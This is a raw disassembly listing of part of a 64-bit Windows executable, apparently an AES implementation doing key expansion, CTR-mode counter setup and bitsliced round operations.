   1400034df:	66 41 0f 6f d2       	movdqa %xmm10,%xmm2
   1400034e4:	66 0f 73 fa 08       	pslldq $0x8,%xmm2
   1400034e9:	66 0f ef d0          	pxor   %xmm0,%xmm2
   1400034ed:	66 45 0f 6f e2       	movdqa %xmm10,%xmm12
   1400034f2:	66 41 0f 73 fc 0c    	pslldq $0xc,%xmm12
   1400034f8:	66 44 0f ef e1       	pxor   %xmm1,%xmm12
   1400034fd:	66 44 0f ef e2       	pxor   %xmm2,%xmm12
   140003502:	66 45 0f ef e2       	pxor   %xmm10,%xmm12
   140003507:	66 44 0f 7f a5 50 08 	movdqa %xmm12,0x850(%rbp)
   14000350e:	00 00 
   140003510:	48 8d 8d 00 08 00 00 	lea    0x800(%rbp),%rcx
   140003517:	48 8d 95 50 08 00 00 	lea    0x850(%rbp),%rdx
   14000351e:	e8 8d 64 00 00       	call   0x1400099b0
   140003523:	66 0f 70 85 00 08 00 	pshufd $0xaa,0x800(%rbp),%xmm0
   14000352a:	00 aa 
   14000352c:	66 41 0f 6f cb       	movdqa %xmm11,%xmm1
   140003531:	66 0f 73 f9 04       	pslldq $0x4,%xmm1
   140003536:	66 41 0f 6f d3       	movdqa %xmm11,%xmm2
   14000353b:	66 0f 73 fa 08       	pslldq $0x8,%xmm2
   140003540:	66 0f ef d0          	pxor   %xmm0,%xmm2
   140003544:	66 45 0f 6f eb       	movdqa %xmm11,%xmm13
   140003549:	66 41 0f 73 fd 0c    	pslldq $0xc,%xmm13
   14000354f:	66 44 0f ef e9       	pxor   %xmm1,%xmm13
   140003554:	66 44 0f ef ea       	pxor   %xmm2,%xmm13
   140003559:	66 45 0f ef eb       	pxor   %xmm11,%xmm13
   14000355e:	66 44 0f 7f ad 50 08 	movdqa %xmm13,0x850(%rbp)
   140003565:	00 00 
   140003567:	48 8d 8d 70 0d 00 00 	lea    0xd70(%rbp),%rcx
   14000356e:	48 8d 95 50 08 00 00 	lea    0x850(%rbp),%rdx
   140003575:	e8 86 64 00 00       	call   0x140009a00
   14000357a:	66 0f 70 85 70 0d 00 	pshufd $0xff,0xd70(%rbp),%xmm0
   140003581:	00 ff 
   140003583:	66 41 0f 6f cc       	movdqa %xmm12,%xmm1
   140003588:	66 0f 73 f9 04       	pslldq $0x4,%xmm1
   14000358d:	66 41 0f 6f d4       	movdqa %xmm12,%xmm2
   140003592:	66 0f 73 fa 08       	pslldq $0x8,%xmm2
   140003597:	66 0f ef d0          	pxor   %xmm0,%xmm2
   14000359b:	66 45 0f 6f f4       	movdqa %xmm12,%xmm14
   1400035a0:	66 41 0f 73 fe 0c    	pslldq $0xc,%xmm14
   1400035a6:	66 44 0f ef f1       	pxor   %xmm1,%xmm14
   1400035ab:	66 44 0f ef f2       	pxor   %xmm2,%xmm14
   1400035b0:	66 45 0f ef f4       	pxor   %xmm12,%xmm14
   1400035b5:	66 44 0f 7f b5 50 08 	movdqa %xmm14,0x850(%rbp)
   1400035bc:	00 00 
   1400035be:	48 8d 8d d0 03 00 00 	lea    0x3d0(%rbp),%rcx
   1400035c5:	48 8d 95 50 08 00 00 	lea    0x850(%rbp),%rdx
   1400035cc:	e8 df 63 00 00       	call   0x1400099b0
   1400035d1:	66 0f 70 85 d0 03 00 	pshufd $0xaa,0x3d0(%rbp),%xmm0
   1400035d8:	00 aa 
   1400035da:	66 41 0f 6f cd       	movdqa %xmm13,%xmm1
   1400035df:	66 0f 73 f9 04       	pslldq $0x4,%xmm1
   1400035e4:	66 41 0f 6f d5       	movdqa %xmm13,%xmm2
   1400035e9:	66 0f 73 fa 08       	pslldq $0x8,%xmm2
   1400035ee:	66 0f ef d0          	pxor   %xmm0,%xmm2
   1400035f2:	66 45 0f 6f fd       	movdqa %xmm13,%xmm15
   1400035f7:	66 41 0f 73 ff 0c    	pslldq $0xc,%xmm15
   1400035fd:	66 44 0f ef f9       	pxor   %xmm1,%xmm15
   140003602:	66 44 0f ef fa       	pxor   %xmm2,%xmm15
   140003607:	66 45 0f ef fd       	pxor   %xmm13,%xmm15
   14000360c:	66 44 0f 7f bd 50 08 	movdqa %xmm15,0x850(%rbp)
   140003613:	00 00 
   140003615:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   140003619:	48 8d 95 50 08 00 00 	lea    0x850(%rbp),%rdx
   140003620:	e8 eb 63 00 00       	call   0x140009a10
   140003625:	66 0f 70 45 d0 ff    	pshufd $0xff,-0x30(%rbp),%xmm0
   14000362b:	66 41 0f 6f ce       	movdqa %xmm14,%xmm1
   140003630:	66 0f 73 f9 08       	pslldq $0x8,%xmm1
   140003635:	66 0f ef c8          	pxor   %xmm0,%xmm1
   140003639:	66 41 0f 6f c6       	movdqa %xmm14,%xmm0
   14000363e:	66 0f 73 f8 04       	pslldq $0x4,%xmm0
   140003643:	66 41 0f 6f d6       	movdqa %xmm14,%xmm2
   140003648:	66 0f 73 fa 0c       	pslldq $0xc,%xmm2
   14000364d:	66 0f ef d0          	pxor   %xmm0,%xmm2
   140003651:	66 0f ef d1          	pxor   %xmm1,%xmm2
   140003655:	0f 28 85 c0 0d 00 00 	movaps 0xdc0(%rbp),%xmm0
   14000365c:	0f 29 45 d0          	movaps %xmm0,-0x30(%rbp)
   140003660:	0f 28 85 20 0d 00 00 	movaps 0xd20(%rbp),%xmm0
   140003667:	0f 29 45 e0          	movaps %xmm0,-0x20(%rbp)
   14000366b:	0f 28 85 d0 0d 00 00 	movaps 0xdd0(%rbp),%xmm0
   140003672:	0f 29 45 f0          	movaps %xmm0,-0x10(%rbp)
   140003676:	0f 28 85 d0 0c 00 00 	movaps 0xcd0(%rbp),%xmm0
   14000367d:	0f 29 45 00          	movaps %xmm0,0x0(%rbp)
   140003681:	66 0f 7f 75 10       	movdqa %xmm6,0x10(%rbp)
   140003686:	66 0f 7f 7d 20       	movdqa %xmm7,0x20(%rbp)
   14000368b:	66 44 0f 7f 45 30    	movdqa %xmm8,0x30(%rbp)
   140003691:	66 44 0f 7f 4d 40    	movdqa %xmm9,0x40(%rbp)
   140003697:	66 44 0f 7f 55 50    	movdqa %xmm10,0x50(%rbp)
   14000369d:	66 44 0f 7f 5d 60    	movdqa %xmm11,0x60(%rbp)
   1400036a3:	66 44 0f 7f 65 70    	movdqa %xmm12,0x70(%rbp)
   1400036a9:	66 44 0f 7f ad 80 00 	movdqa %xmm13,0x80(%rbp)
   1400036b0:	00 00 
   1400036b2:	66 41 0f ef d6       	pxor   %xmm14,%xmm2
   1400036b7:	66 44 0f 7f b5 90 00 	movdqa %xmm14,0x90(%rbp)
   1400036be:	00 00 
   1400036c0:	66 44 0f 7f bd a0 00 	movdqa %xmm15,0xa0(%rbp)
   1400036c7:	00 00 
   1400036c9:	66 0f 7f 95 b0 00 00 	movdqa %xmm2,0xb0(%rbp)
   1400036d0:	00 
   1400036d1:	48 8d 8d 40 09 00 00 	lea    0x940(%rbp),%rcx
   1400036d8:	4c 8d 7d d0          	lea    -0x30(%rbp),%r15
   1400036dc:	4c 89 fa             	mov    %r15,%rdx
   1400036df:	e8 1c d9 ff ff       	call   0x140001000
   1400036e4:	48 8d b5 50 08 00 00 	lea    0x850(%rbp),%rsi
   1400036eb:	41 b8 f0 00 00 00    	mov    $0xf0,%r8d
   1400036f1:	48 89 f1             	mov    %rsi,%rcx
   1400036f4:	4c 89 fa             	mov    %r15,%rdx
   1400036f7:	e8 15 c5 01 00       	call   0x14001fc11
   1400036fc:	48 8d 8d d0 03 00 00 	lea    0x3d0(%rbp),%rcx
   140003703:	41 b8 e0 01 00 00    	mov    $0x1e0,%r8d
   140003709:	48 89 f2             	mov    %rsi,%rdx
   14000370c:	e8 00 c5 01 00       	call   0x14001fc11
   140003711:	4c 8b b5 18 0d 00 00 	mov    0xd18(%rbp),%r14
   140003718:	48 8b 9d c0 0c 00 00 	mov    0xcc0(%rbp),%rbx
   14000371f:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   140003723:	48 8d 95 d0 03 00 00 	lea    0x3d0(%rbp),%rdx
   14000372a:	41 b8 c0 03 00 00    	mov    $0x3c0,%r8d
   140003730:	e8 dc c4 01 00       	call   0x14001fc11
   140003735:	66 0f ef f6          	pxor   %xmm6,%xmm6
   140003739:	66 0f 7f b5 b0 03 00 	movdqa %xmm6,0x3b0(%rbp)
   140003740:	00 
   140003741:	48 8d 85 90 03 00 00 	lea    0x390(%rbp),%rax
   140003748:	66 0f 7f b5 90 03 00 	movdqa %xmm6,0x390(%rbp)
   14000374f:	00 
   140003750:	48 b9 55 02 48 91 02 	movabs $0x14f4140291480255,%rcx
   140003757:	14 f4 14 
   14000375a:	48 89 8d a8 03 00 00 	mov    %rcx,0x3a8(%rbp)
   140003761:	48 b9 26 26 21 d4 a7 	movabs $0x865dcca7d4212626,%rcx
   140003768:	cc 5d 86 
   14000376b:	48 89 8d a0 03 00 00 	mov    %rcx,0x3a0(%rbp)
   140003772:	c6 85 c0 03 00 00 00 	movb   $0x0,0x3c0(%rbp)
   140003779:	48 89 85 00 08 00 00 	mov    %rax,0x800(%rbp)
   140003780:	4c 89 b5 08 08 00 00 	mov    %r14,0x808(%rbp)
   140003787:	4c 89 b5 10 08 00 00 	mov    %r14,0x810(%rbp)
   14000378e:	48 c7 85 18 08 00 00 	movq   $0xbe60,0x818(%rbp)
   140003795:	60 be 00 00 
   140003799:	0f b6 05 60 58 0e 00 	movzbl 0xe5860(%rip),%eax        # 0x1400e9000
   1400037a0:	3c 01                	cmp    $0x1,%al
   1400037a2:	75 15                	jne    0x1400037b9
   1400037a4:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   1400037a8:	48 8d 95 00 08 00 00 	lea    0x800(%rbp),%rdx
   1400037af:	e8 7c 48 00 00       	call   0x140008030
   1400037b4:	e9 ac 14 00 00       	jmp    0x140004c65
   1400037b9:	48 c7 85 b8 0c 00 00 	movq   $0x0,0xcb8(%rbp)
   1400037c0:	00 00 00 00 
   1400037c4:	48 8d b5 50 08 00 00 	lea    0x850(%rbp),%rsi
   1400037cb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400037d0:	48 8b 8d 90 03 00 00 	mov    0x390(%rbp),%rcx
   1400037d7:	48 8b 95 98 03 00 00 	mov    0x398(%rbp),%rdx
   1400037de:	48 8b 85 a0 03 00 00 	mov    0x3a0(%rbp),%rax
   1400037e5:	48 01 c8             	add    %rcx,%rax
   1400037e8:	4c 8b 85 a8 03 00 00 	mov    0x3a8(%rbp),%r8
   1400037ef:	49 11 d0             	adc    %rdx,%r8
   1400037f2:	4d 89 c1             	mov    %r8,%r9
   1400037f5:	49 0f c9             	bswap  %r9
   1400037f8:	49 89 c2             	mov    %rax,%r10
   1400037fb:	49 0f ca             	bswap  %r10
   1400037fe:	4c 89 95 d8 03 00 00 	mov    %r10,0x3d8(%rbp)
   140003805:	49 89 c2             	mov    %rax,%r10
   140003808:	49 83 c2 01          	add    $0x1,%r10
   14000380c:	4d 89 c3             	mov    %r8,%r11
   14000380f:	49 83 d3 00          	adc    $0x0,%r11
   140003813:	49 0f cb             	bswap  %r11
   140003816:	49 0f ca             	bswap  %r10
   140003819:	4c 89 8d d0 03 00 00 	mov    %r9,0x3d0(%rbp)
   140003820:	4c 89 95 e8 03 00 00 	mov    %r10,0x3e8(%rbp)
   140003827:	4c 89 9d e0 03 00 00 	mov    %r11,0x3e0(%rbp)
   14000382e:	49 89 c1             	mov    %rax,%r9
   140003831:	49 83 c1 02          	add    $0x2,%r9
   140003835:	4d 89 c2             	mov    %r8,%r10
   140003838:	49 83 d2 00          	adc    $0x0,%r10
   14000383c:	49 0f ca             	bswap  %r10
   14000383f:	49 0f c9             	bswap  %r9
   140003842:	4c 89 8d f8 03 00 00 	mov    %r9,0x3f8(%rbp)
   140003849:	48 83 c0 03          	add    $0x3,%rax
   14000384d:	49 83 d0 00          	adc    $0x0,%r8
   140003851:	49 0f c8             	bswap  %r8
   140003854:	48 0f c8             	bswap  %rax
   140003857:	4c 89 95 f0 03 00 00 	mov    %r10,0x3f0(%rbp)
   14000385e:	48 83 c1 04          	add    $0x4,%rcx
   140003862:	48 83 d2 00          	adc    $0x0,%rdx
   140003866:	48 89 8d 90 03 00 00 	mov    %rcx,0x390(%rbp)
   14000386d:	48 89 95 98 03 00 00 	mov    %rdx,0x398(%rbp)
   140003874:	48 89 85 08 04 00 00 	mov    %rax,0x408(%rbp)
   14000387b:	4c 89 85 00 04 00 00 	mov    %r8,0x400(%rbp)
   140003882:	48 8d 85 00 04 00 00 	lea    0x400(%rbp),%rax
   140003889:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000388e:	48 89 f1             	mov    %rsi,%rcx
   140003891:	48 8d 95 d0 03 00 00 	lea    0x3d0(%rbp),%rdx
   140003898:	4c 8d 85 e0 03 00 00 	lea    0x3e0(%rbp),%r8
   14000389f:	4c 8d 8d f0 03 00 00 	lea    0x3f0(%rbp),%r9
   1400038a6:	e8 35 59 00 00       	call   0x1400091e0
   1400038ab:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
   1400038af:	48 31 85 50 08 00 00 	xor    %rax,0x850(%rbp)
   1400038b6:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   1400038ba:	48 31 85 58 08 00 00 	xor    %rax,0x858(%rbp)
   1400038c1:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   1400038c5:	48 31 85 60 08 00 00 	xor    %rax,0x860(%rbp)
   1400038cc:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   1400038d0:	48 31 85 68 08 00 00 	xor    %rax,0x868(%rbp)
   1400038d7:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   1400038db:	48 31 85 70 08 00 00 	xor    %rax,0x870(%rbp)
   1400038e2:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   1400038e6:	48 31 85 78 08 00 00 	xor    %rax,0x878(%rbp)
   1400038ed:	48 8b 45 00          	mov    0x0(%rbp),%rax
   1400038f1:	48 31 85 80 08 00 00 	xor    %rax,0x880(%rbp)
   1400038f8:	48 8b 8d 88 08 00 00 	mov    0x888(%rbp),%rcx
   1400038ff:	48 33 4d 08          	xor    0x8(%rbp),%rcx
   140003903:	48 c7 85 c0 0d 00 00 	movq   $0x0,0xdc0(%rbp)
   14000390a:	00 00 00 00 
   14000390e:	66 90                	xchg   %ax,%ax
   140003910:	48 89 8d 88 08 00 00 	mov    %rcx,0x888(%rbp)
   140003917:	48 89 f1             	mov    %rsi,%rcx
   14000391a:	e8 d1 5c 00 00       	call   0x1400095f0
   14000391f:	4c 8b b5 50 08 00 00 	mov    0x850(%rbp),%r14
   140003926:	48 8b 9d 58 08 00 00 	mov    0x858(%rbp),%rbx
   14000392d:	4c 8b 85 60 08 00 00 	mov    0x860(%rbp),%r8
   140003934:	48 8b 95 68 08 00 00 	mov    0x868(%rbp),%rdx
   14000393b:	4c 8b 8d 70 08 00 00 	mov    0x870(%rbp),%r9
   140003942:	4c 89 f0             	mov    %r14,%rax
   140003945:	48 c1 c0 2c          	rol    $0x2c,%rax
   140003949:	48 8b bd 78 08 00 00 	mov    0x878(%rbp),%rdi
   140003950:	4d 89 f3             	mov    %r14,%r11
   140003953:	49 c1 c3 3c          	rol    $0x3c,%r11
   140003957:	49 ba ff 0f ff 0f ff 	movabs $0xfff0fff0fff0fff,%r10
   14000395e:	0f ff 0f 
   140003961:	4c 21 d0             	and    %r10,%rax
   140003964:	4d 21 e3             	and    %r12,%r11
   140003967:	49 09 c3             	or     %rax,%r11
   14000396a:	48 89 d8             	mov    %rbx,%rax
   14000396d:	48 c1 c0 2c          	rol    $0x2c,%rax
   140003971:	4c 21 d0             	and    %r10,%rax
   140003974:	48 89 d9             	mov    %rbx,%rcx
   140003977:	48 c1 c1 3c          	rol    $0x3c,%rcx
   14000397b:	4c 21 e1             	and    %r12,%rcx
   14000397e:	48 09 c1             	or     %rax,%rcx
   140003981:	48 89 8d e8 0c 00 00 	mov    %rcx,0xce8(%rbp)
   140003988:	4c 89 c0             	mov    %r8,%rax
   14000398b:	48 c1 c0 2c          	rol    $0x2c,%rax
   14000398f:	4c 21 d0             	and    %r10,%rax
   140003992:	4d 89 c5             	mov    %r8,%r13
   140003995:	49 c1 c5 3c          	rol    $0x3c,%r13
   140003999:	4d 21 e5             	and    %r12,%r13
   14000399c:	49 09 c5             	or     %rax,%r13
   14000399f:	4c 89 ad 00 0d 00 00 	mov    %r13,0xd00(%rbp)
   1400039a6:	48 89 d0             	mov    %rdx,%rax
   1400039a9:	48 c1 c0 2c          	rol    $0x2c,%rax
   1400039ad:	4c 21 d0             	and    %r10,%rax
   1400039b0:	49 89 d7             	mov    %rdx,%r15
   1400039b3:	49 c1 c7 3c          	rol    $0x3c,%r15
   1400039b7:	4d 21 e7             	and    %r12,%r15
   1400039ba:	4c 89 8d d0 0d 00 00 	mov    %r9,0xdd0(%rbp)
   1400039c1:	4c 89 c9             	mov    %r9,%rcx
   1400039c4:	48 c1 c1 2c          	rol    $0x2c,%rcx
   1400039c8:	49 09 c7             	or     %rax,%r15
   1400039cb:	4c 89 bd c8 0c 00 00 	mov    %r15,0xcc8(%rbp)
   1400039d2:	4c 89 c8             	mov    %r9,%rax
   1400039d5:	48 c1 c0 3c          	rol    $0x3c,%rax
   1400039d9:	4c 21 d1             	and    %r10,%rcx
   1400039dc:	4c 21 e0             	and    %r12,%rax
   1400039df:	48 09 c8             	or     %rcx,%rax
   1400039e2:	48 89 85 f8 0c 00 00 	mov    %rax,0xcf8(%rbp)
   1400039e9:	48 89 f9             	mov    %rdi,%rcx
   1400039ec:	48 89 bd 20 0d 00 00 	mov    %rdi,0xd20(%rbp)
   1400039f3:	48 89 f8             	mov    %rdi,%rax
   1400039f6:	48 c1 c0 2c          	rol    $0x2c,%rax
   1400039fa:	4c 21 d0             	and    %r10,%rax
   1400039fd:	48 c1 c1 3c          	rol    $0x3c,%rcx
   140003a01:	4c 21 e1             	and    %r12,%rcx
   140003a04:	48 09 c1             	or     %rax,%rcx
   140003a07:	48 89 8d d0 0c 00 00 	mov    %rcx,0xcd0(%rbp)
   140003a0e:	48 8b b5 80 08 00 00 	mov    0x880(%rbp),%rsi
   140003a15:	48 89 f0             	mov    %rsi,%rax
   140003a18:	48 c1 c0 2c          	rol    $0x2c,%rax
   140003a1c:	4c 21 d0             	and    %r10,%rax
   140003a1f:	48 89 f1             	mov    %rsi,%rcx
   140003a22:	48 c1 c1 3c          	rol    $0x3c,%rcx
   140003a26:	4c 21 e1             	and    %r12,%rcx
   140003a29:	48 09 c1             	or     %rax,%rcx
   140003a2c:	48 89 8d b8 0d 00 00 	mov    %rcx,0xdb8(%rbp)
   140003a33:	48 8b 8d 88 08 00 00 	mov    0x888(%rbp),%rcx
   140003a3a:	48 89 8d e8 0d 00 00 	mov    %rcx,0xde8(%rbp)
   140003a41:	48 89 c8             	mov    %rcx,%rax
   140003a44:	48 c1 c0 2c          	rol    $0x2c,%rax
   140003a48:	4c 21 d0             	and    %r10,%rax
   140003a4b:	49 89 d9             	mov    %rbx,%r9
   140003a4e:	48 c1 c1 3c          	rol    $0x3c,%rcx
   140003a52:	4c 21 e1             	and    %r12,%rcx
   140003a55:	48 09 c1             	or     %rax,%rcx
   140003a58:	48 89 8d f0 0c 00 00 	mov    %rcx,0xcf0(%rbp)
   140003a5f:	4d 31 de             	xor    %r11,%r14
   140003a62:	4c 89 f0             	mov    %r14,%rax
   140003a65:	48 c1 c0 18          	rol    $0x18,%rax
   140003a69:	49 bc ff 00 ff 00 ff 	movabs $0xff00ff00ff00ff,%r12
   140003a70:	00 ff 00 
   140003a73:	4c 21 e0             	and    %r12,%rax
   140003a76:	4d 89 f2             	mov    %r14,%r10
   140003a79:	49 c1 c2 28          	rol    $0x28,%r10
   140003a7d:	48 bf 00 ff 00 ff 00 	movabs $0xff00ff00ff00ff00,%rdi
   140003a84:	ff 00 ff 
   140003a87:	49 21 fa             	and    %rdi,%r10
   140003a8a:	49 09 c2             	or     %rax,%r10
   140003a8d:	4c 89 95 e0 0d 00 00 	mov    %r10,0xde0(%rbp)
   140003a94:	4c 33 8d e8 0c 00 00 	xor    0xce8(%rbp),%r9
   140003a9b:	4c 89 c9             	mov    %r9,%rcx
   140003a9e:	48 c1 c1 18          	rol    $0x18,%rcx
   140003aa2:	4c 21 e1             	and    %r12,%rcx
   140003aa5:	4d 89 ca             	mov    %r9,%r10
   140003aa8:	49 c1 c2 28          	rol    $0x28,%r10
   140003aac:	49 21 fa             	and    %rdi,%r10
   140003aaf:	49 09 ca             	or     %rcx,%r10
   140003ab2:	4c 89 95 08 0d 00 00 	mov    %r10,0xd08(%rbp)
   140003ab9:	4d 31 e8             	xor    %r13,%r8
   140003abc:	4c 89 c1             	mov    %r8,%rcx
   140003abf:	48 c1 c1 18          	rol    $0x18,%rcx
   140003ac3:	4c 21 e1             	and    %r12,%rcx
   140003ac6:	4c 89 c3             	mov    %r8,%rbx
   140003ac9:	48 c1 c3 28          	rol    $0x28,%rbx
   140003acd:	48 21 fb             	and    %rdi,%rbx
   140003ad0:	48 09 cb             	or     %rcx,%rbx
   140003ad3:	4c 31 fa             	xor    %r15,%rdx
   140003ad6:	48 89 d1             	mov    %rdx,%rcx
   140003ad9:	48 c1 c1 18          	rol    $0x18,%rcx
   140003add:	4c 21 e1             	and    %r12,%rcx
   140003ae0:	4d 89 e5             	mov    %r12,%r13
   140003ae3:	49 89 d4             	mov    %rdx,%r12
   140003ae6:	49 c1 c4 28          	rol    $0x28,%r12
   140003aea:	49 21 fc             	and    %rdi,%r12
   140003aed:	49 09 cc             	or     %rcx,%r12
   140003af0:	48 8b 8d d0 0d 00 00 	mov    0xdd0(%rbp),%rcx
   140003af7:	48 33 8d f8 0c 00 00 	xor    0xcf8(%rbp),%rcx
   140003afe:	48 89 8d d0 0d 00 00 	mov    %rcx,0xdd0(%rbp)
   140003b05:	49 89 ca             	mov    %rcx,%r10
   140003b08:	49 c1 c2 18          	rol    $0x18,%r10
   140003b0c:	4d 21 ea             	and    %r13,%r10
   140003b0f:	4c 89 e8             	mov    %r13,%rax
   140003b12:	48 c1 c1 28          	rol    $0x28,%rcx
   140003b16:	48 21 f9             	and    %rdi,%rcx
   140003b19:	4c 09 d1             	or     %r10,%rcx
   140003b1c:	4c 8b ad 20 0d 00 00 	mov    0xd20(%rbp),%r13
   140003b23:	4c 33 ad d0 0c 00 00 	xor    0xcd0(%rbp),%r13
   140003b2a:	4c 89 ad 20 0d 00 00 	mov    %r13,0xd20(%rbp)
   140003b31:	4d 89 ea             	mov    %r13,%r10
   140003b34:	49 c1 c2 18          	rol    $0x18,%r10
   140003b38:	49 21 c2             	and    %rax,%r10
   140003b3b:	49 c1 c5 28          	rol    $0x28,%r13
   140003b3f:	49 21 fd             	and    %rdi,%r13
   140003b42:	4d 09 d5             	or     %r10,%r13
   140003b45:	49 89 f2             	mov    %rsi,%r10
   140003b48:	4c 33 95 b8 0d 00 00 	xor    0xdb8(%rbp),%r10
   140003b4f:	4d 89 d7             	mov    %r10,%r15
   140003b52:	4c 89 95 10 0d 00 00 	mov    %r10,0xd10(%rbp)
   140003b59:	49 c1 c7 18          	rol    $0x18,%r15
   140003b5d:	49 21 c7             	and    %rax,%r15
   140003b60:	49 c1 c2 28          	rol    $0x28,%r10
   140003b64:	49 21 fa             	and    %rdi,%r10
   140003b67:	4d 09 fa             	or     %r15,%r10
   140003b6a:	4c 33 b5 e8 0c 00 00 	xor    0xce8(%rbp),%r14
   140003b71:	4c 33 85 c8 0c 00 00 	xor    0xcc8(%rbp),%r8
   140003b78:	48 33 95 f8 0c 00 00 	xor    0xcf8(%rbp),%rdx
   140003b7f:	48 8b bd e8 0d 00 00 	mov    0xde8(%rbp),%rdi
   140003b86:	48 33 bd f0 0c 00 00 	xor    0xcf0(%rbp),%rdi
   140003b8d:	49 31 fb             	xor    %rdi,%r11
   140003b90:	49 31 fe             	xor    %rdi,%r14
   140003b93:	49 31 f8             	xor    %rdi,%r8
   140003b96:	48 31 fa             	xor    %rdi,%rdx
   140003b99:	49 89 ff             	mov    %rdi,%r15
   140003b9c:	48 c1 c7 18          	rol    $0x18,%rdi
   140003ba0:	49 c1 c7 28          	rol    $0x28,%r15
   140003ba4:	48 21 c7             	and    %rax,%rdi
   140003ba7:	48 b8 00 ff 00 ff 00 	movabs $0xff00ff00ff00ff00,%rax
   140003bae:	ff 00 ff 
   140003bb1:	49 21 c7             	and    %rax,%r15
   140003bb4:	48 8b 85 c0 0d 00 00 	mov    0xdc0(%rbp),%rax
   140003bbb:	48 8b b5 e0 0d 00 00 	mov    0xde0(%rbp),%rsi
   140003bc2:	48 33 74 c5 10       	xor    0x10(%rbp,%rax,8),%rsi
   140003bc7:	49 09 ff             	or     %rdi,%r15
   140003bca:	49 31 f3             	xor    %rsi,%r11
   140003bcd:	48 8b b5 08 0d 00 00 	mov    0xd08(%rbp),%rsi
   140003bd4:	48 33 74 c5 18       	xor    0x18(%rbp,%rax,8),%rsi
   140003bd9:	49 31 f6             	xor    %rsi,%r14
   140003bdc:	4c 33 8d 00 0d 00 00 	xor    0xd00(%rbp),%r9
   140003be3:	48 33 5c c5 20       	xor    0x20(%rbp,%rax,8),%rbx
   140003be8:	49 31 d9             	xor    %rbx,%r9
   140003beb:	48 8b 9d d0 0d 00 00 	mov    0xdd0(%rbp),%rbx
   140003bf2:	4c 33 64 c5 28       	xor    0x28(%rbp,%rax,8),%r12
   140003bf7:	4d 31 e0             	xor    %r12,%r8
   140003bfa:	48 33 4c c5 30       	xor    0x30(%rbp,%rax,8),%rcx
   140003bff:	48 31 ca             	xor    %rcx,%rdx
   140003c02:	48 33 9d d0 0c 00 00 	xor    0xcd0(%rbp),%rbx
   140003c09:	4c 33 6c c5 38       	xor    0x38(%rbp,%rax,8),%r13
   140003c0e:	4c 31 eb             	xor    %r13,%rbx
   140003c11:	48 8b bd 20 0d 00 00 	mov    0xd20(%rbp),%rdi
   140003c18:	48 33 bd b8 0d 00 00 	xor    0xdb8(%rbp),%rdi
   140003c1f:	4c 33 54 c5 40       	xor    0x40(%rbp,%rax,8),%r10
   140003c24:	4c 31 d7             	xor    %r10,%rdi
   140003c27:	48 8b b5 10 0d 00 00 	mov    0xd10(%rbp),%rsi
   140003c2e:	48 33 b5 f0 0c 00 00 	xor    0xcf0(%rbp),%rsi
   140003c35:	4c 33 7c c5 48       	xor    0x48(%rbp,%rax,8),%r15
   140003c3a:	4c 31 fe             	xor    %r15,%rsi
   140003c3d:	4c 89 9d 50 08 00 00 	mov    %r11,0x850(%rbp)
   140003c44:	4c 89 b5 58 08 00 00 	mov    %r14,0x858(%rbp)
   140003c4b:	4c 89 8d 60 08 00 00 	mov    %r9,0x860(%rbp)
   140003c52:	4c 89 85 68 08 00 00 	mov    %r8,0x868(%rbp)
   140003c59:	48 89 95 70 08 00 00 	mov    %rdx,0x870(%rbp)
   140003c60:	48 89 9d 78 08 00 00 	mov    %rbx,0x878(%rbp)
   140003c67:	48 89 bd 80 08 00 00 	mov    %rdi,0x880(%rbp)
   140003c6e:	48 89 b5 88 08 00 00 	mov    %rsi,0x888(%rbp)
   140003c75:	48 83 f8 60          	cmp    $0x60,%rax
   140003c79:	0f 84 c1 07 00 00    	je     0x140004440
   140003c7f:	48 8d 8d 50 08 00 00 	lea    0x850(%rbp),%rcx
   140003c86:	e8 65 59 00 00       	call   0x1400095f0
   140003c8b:	4c 8b 95 50 08 00 00 	mov    0x850(%rbp),%r10
   140003c92:	4c 8b 8d 58 08 00 00 	mov    0x858(%rbp),%r9
   140003c99:	4c 8b 85 60 08 00 00 	mov    0x860(%rbp),%r8
   140003ca0:	48 8b 95 68 08 00 00 	mov    0x868(%rbp),%rdx
   140003ca7:	48 8b 9d 70 08 00 00 	mov    0x870(%rbp),%rbx
   140003cae:	48 8b bd 78 08 00 00 	mov    0x878(%rbp),%rdi
   140003cb5:	4c 89 d0             	mov    %r10,%rax
   140003cb8:	48 c1 c0 28          	rol    $0x28,%rax
   140003cbc:	48 be ff 00 ff 00 ff 	movabs $0xff00ff00ff00ff,%rsi
   140003cc3:	00 ff 00 
   140003cc6:	48 21 f0             	and    %rsi,%rax
   140003cc9:	4d 89 d6             	mov    %r10,%r14
   140003ccc:	49 c1 c6 38          	rol    $0x38,%r14
   140003cd0:	48 b9 00 ff 00 ff 00 	movabs $0xff00ff00ff00ff00,%rcx
   140003cd7:	ff 00 ff 
   140003cda:	49 21 ce             	and    %rcx,%r14
   140003cdd:	49 09 c6             	or     %rax,%r14
   140003ce0:	4c 89 8d d0 0c 00 00 	mov    %r9,0xcd0(%rbp)
   140003ce7:	4c 89 c8             	mov    %r9,%rax
   140003cea:	48 c1 c0 28          	rol    $0x28,%rax
   140003cee:	48 21 f0             	and    %rsi,%rax
   140003cf1:	49 c1 c1 38          	rol    $0x38,%r9
   140003cf5:	49 21 c9             	and    %rcx,%r9
   140003cf8:	49 09 c1             	or     %rax,%r9
   140003cfb:	4c 89 c0             	mov    %r8,%rax
   140003cfe:	48 c1 c0 28          	rol    $0x28,%rax
   140003d02:	48 21 f0             	and    %rsi,%rax
   140003d05:	4d 89 c5             	mov    %r8,%r13
   140003d08:	49 c1 c5 38          	rol    $0x38,%r13
   140003d0c:	49 21 cd             	and    %rcx,%r13
   140003d0f:	49 89 d3             	mov    %rdx,%r11
   140003d12:	49 c1 c3 28          	rol    $0x28,%r11
   140003d16:	49 09 c5             	or     %rax,%r13
   140003d19:	49 89 d7             	mov    %rdx,%r15
   140003d1c:	49 c1 c7 38          	rol    $0x38,%r15
   140003d20:	49 21 f3             	and    %rsi,%r11
   140003d23:	49 21 cf             	and    %rcx,%r15
   140003d26:	4d 09 df             	or     %r11,%r15
